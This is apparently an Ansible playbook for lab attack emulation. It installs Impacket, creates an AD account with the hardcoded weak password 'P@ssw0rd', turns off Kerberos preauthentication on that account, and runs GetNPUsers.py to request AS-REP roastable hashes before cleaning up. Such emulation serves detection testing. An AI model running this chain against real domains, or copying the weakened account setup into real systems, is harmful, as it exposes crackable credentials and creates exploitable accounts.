# Download Impacket and install dependencies
- name: Download and unarchive impacket
  ansible.builtin.unarchive:
    src: https://github.com/fortra/impacket/releases/download/impacket_0_12_0/impacket-0.12.0.tar.gz
    dest: /tmp
    remote_src: yes
  delegate_to: localhost

- name: Append impacket into requirements.txt
  ansible.builtin.lineinfile:
    path: /tmp/impacket-0.12.0/requirements.txt
    line: "impacket"
    insertafter: EOF
  delegate_to: localhost

- name: Install virtualenv via apt package
  ansible.builtin.apt:
    name: python3-virtualenv
    update_cache: yes
  delegate_to: localhost

- name: Install specified python requirements in indicated (virtualenv)
  ansible.builtin.pip:
    requirements: /tmp/impacket-0.12.0/requirements.txt
    virtualenv: /tmp/impacket-0.12.0/venv
  delegate_to: localhost

# Create account and enable Do not require Kerberos preauthentication
- name: Create account
  microsoft.ad.user:
    identity: asrep
    password: P@ssw0rd
    state: present

- name: Enable do not require Kerberos preauthentication
  ansible.windows.win_powershell:
    script: "Set-ADAccountControl -Identity asrep -DoesNotRequirePreAuth $true"

# Run impacket
- name: Run GetNPUsers.py
  ansible.builtin.script:
    cmd: "/tmp/impacket-0.12.0/examples/GetNPUsers.py {{ domain_name }}/{{ ansible_user }}:{{ ansible_password }} -dc-ip {{ ansible_host }} -request"
    executable: /tmp/impacket-0.12.0/venv/bin/python
  delegate_to: localhost
  register: asreproasting_output

- name: Print AS-REP Roasting output
  ansible.builtin.debug:
    msg: "{{ asreproasting_output.stdout }}"

# Cleanup
- name: Delete impacket
  ansible.builtin.file:
    path: /tmp/impacket-0.12.0
    state: absent
  delegate_to: localhost

- name: Delete account
  microsoft.ad.user:
      identity: asrep
      state: absent